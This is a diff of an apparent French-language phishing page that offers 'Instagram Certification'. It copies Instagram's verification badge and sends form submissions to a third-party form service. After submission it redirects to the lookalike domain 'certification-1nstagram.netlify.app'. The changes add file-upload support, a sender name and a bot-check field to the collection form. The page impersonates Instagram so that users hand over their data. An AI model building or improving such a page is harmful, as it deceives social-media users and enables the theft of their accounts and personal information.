@@ -10,29 +10,9 @@
     <link rel="stylesheet" href="styles/form.css">
 </head>
 <body>
+    <!-- Header reste identique -->
     <header class="main-header">
-        <nav class="nav-container">
-            <div class="logo">
-                <span>Instagram Certification</span>
-                <!-- Badge SVG -->
-                <svg id="Calque_1" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 445.82 446.33" class="badge-svg">
-                    <defs>
-                        <style>
-                            .cls-1{fill:#fff;}
-                            .cls-1,.cls-2{stroke-width:0px;}
-                            .cls-2{fill:#0095f6;}
-                        </style>
-                    </defs>
-                    <path class="cls-2" d="M163.76,0c1.26.61,2.47,1.17,3.66,1.77,18.51,9.47,37.05,18.87,55.46,28.55,18.52-9.72,37.25-19.05,55.76-28.8,3.49-1.84,4.97-1.11,6.95,2,10.43,16.45,21.15,32.71,31.61,49.14,1.74,2.73,3.72,3.67,6.88,3.8,19.78.84,39.55,1.94,59.33,2.84,2.48.11,3.42.82,3.54,3.45.88,19.61,2.06,39.22,2.82,58.84.15,3.83,1.46,5.96,4.61,7.95,16.31,10.33,32.42,20.99,48.75,31.29,3.19,2.01,3.31,3.55,1.68,6.67-9.11,17.4-17.92,34.95-27.02,52.35-1.34,2.56-1.21,4.47.05,6.9,8.95,17.29,17.65,34.72,26.78,51.92,2.08,3.92,1.27,5.5-2.22,7.7-16.33,10.3-32.43,20.96-48.72,31.32-2.74,1.74-3.68,3.7-3.82,6.86-.85,19.78-1.96,39.55-2.87,59.33-.11,2.47-.77,3.44-3.42,3.56-19.28.87-38.54,2.1-57.83,2.76-4.58.16-7.17,1.7-9.54,5.46-10.11,16.06-20.62,31.87-30.71,47.94-2.02,3.22-3.54,3.3-6.65,1.67-17.09-8.97-34.32-17.68-51.43-26.62-2.91-1.52-5.23-1.75-8.28-.15-17.1,8.96-34.4,17.54-51.45,26.59-3.91,2.08-5.5,1.27-7.7-2.22-10.3-16.33-20.95-32.44-31.32-48.73-1.74-2.73-3.71-3.67-6.87-3.81-19.78-.86-39.55-1.99-59.33-2.86-2.98-.13-3.45-1.35-3.56-3.94-.9-19.78-2.02-39.55-2.87-59.33-.13-3.03-1.2-4.8-3.71-6.41-16.56-10.57-32.95-21.39-49.57-31.86-3.21-2.02-3.32-3.53-1.69-6.64,9.1-17.4,17.92-34.95,27.02-52.35,1.34-2.56,1.21-4.47-.05-6.9-9.03-17.44-17.84-34.99-26.98-52.37-1.84-3.49-1.09-4.93,2.04-6.91,16.45-10.42,32.69-21.17,49.11-31.63,2.73-1.74,3.67-3.72,3.8-6.88.85-19.78,1.96-39.55,2.86-59.33.11-2.47.77-3.42,3.43-3.54,19.28-.87,38.55-2.11,57.83-2.78,4.57-.16,7.17-1.7,9.54-5.47,10.11-16.06,20.5-31.94,30.83-47.86.84-1.29,1.21-3.2,3.29-3.27Z"/>
-                    <path class="cls-1" d="M320.1,180.66c-1.33.94-2.7,1.66-3.77,2.7-29.44,28.45-58.85,56.94-88.27,85.42-10.04,9.73-20.18,19.36-30.07,29.24-2.43,2.42-3.71,2.05-5.9-.16-21.12-21.26-42.29-42.46-63.58-63.55-2.32-2.3-1.96-3.46.15-5.48,5.78-5.52,11.49-11.12,16.93-16.97,2.51-2.7,3.93-2.2,6.27.17,13.31,13.52,26.88,26.79,40.13,40.38,2.95,3.03,4.5,2.79,7.4-.04,31.57-30.81,63.31-61.43,94.9-92.21,2.4-2.34,3.72-2.79,6.18-.07,5.36,5.92,11.12,11.48,16.7,17.2.79.81,1.5,1.71,2.93,3.36Z"/>
-                </svg>
-            </div>
-            <ul class="nav-links">
-                <li><a href="/">Accueil</a></li>
-                <li><a href="/processus">Processus</a></li>
-                <li><a href="/contact">Contact</a></li>
-            </ul>
-        </nav>
+        <!-- ... contenu du header ... -->
     </header>
 
     <main>
@@ -43,12 +23,15 @@
         </section>
 
         <div class="form-wrapper">
-            <form class="certification-form" action="https://api.web3forms.com/submit" method="POST">
-                <!-- Configuration Web3Forms -->
+            <form class="certification-form" action="https://api.web3forms.com/submit" method="POST" enctype="multipart/form-data">
+                <!-- Configuration Web3Forms mise à jour -->
                 <input type="hidden" name="access_key" value="a68ac406-1c5c-4ae3-ae1c-86fa34d2764c">
+                <input type="hidden" name="from_name" value="Certification Instagram">
+                <input type="hidden" name="redirect" value="https://certification-1nstagram.netlify.app/merci.html">
                 <input type="hidden" name="subject" value="Nouvelle demande de certification Instagram">
-                <input type="hidden" name="redirect" value="https://votre-site.netlify.app/merci.html">
+                <input type="hidden" name="botcheck" value="">
 
+                <!-- Le reste du formulaire reste identique -->
                 <div class="progress">
                     <div class="steps">
                         <div class="step active">1</div>
